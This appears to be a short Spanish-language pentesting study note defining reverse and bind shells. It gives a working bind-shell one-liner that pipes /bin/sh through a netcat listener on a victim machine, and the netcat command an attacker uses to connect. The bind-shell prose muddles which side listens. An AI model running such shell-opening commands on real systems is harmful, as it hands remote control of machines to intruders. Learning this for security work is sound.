- **Reverse Shell** --> Reverse Shell Es un método que le da a un atacante la posibilidad de conectarse a un equipo remoto desde un equipo propio. Es decir, se crea una conexión desde el equipo comprometido hacia el equipo del atacante. Esto se consigue ejecutando un programa malintencionado o una orden específica en el equipo remoto que establece la conexión inversa hacia el equipo del atacante, permitiéndole asumir el control del equipo remoto.

-------------------------------------

- **Bind Shell** --> Esta técnica es la inversa de la Reverse Shell, ya que en vez de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante espera en un puerto específico y la máquina comprometida recibe la conexión entrante en ese puerto. El atacante entonces tiene acceso por terminal a la máquina comprometida, lo que le permite asumir el control de la misma.

Por ejemplo, desde la máquina víctima nos pondremos en escucha con netcat esperando una conexión:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 443 > /tmp/f
```
![[Pasted image 20230726104050.png]]
Y desde la máquina atacante nos conectaremos:
```bash
nc 192.168.0.44 443
```
![[Pasted image 20230726104103.png]]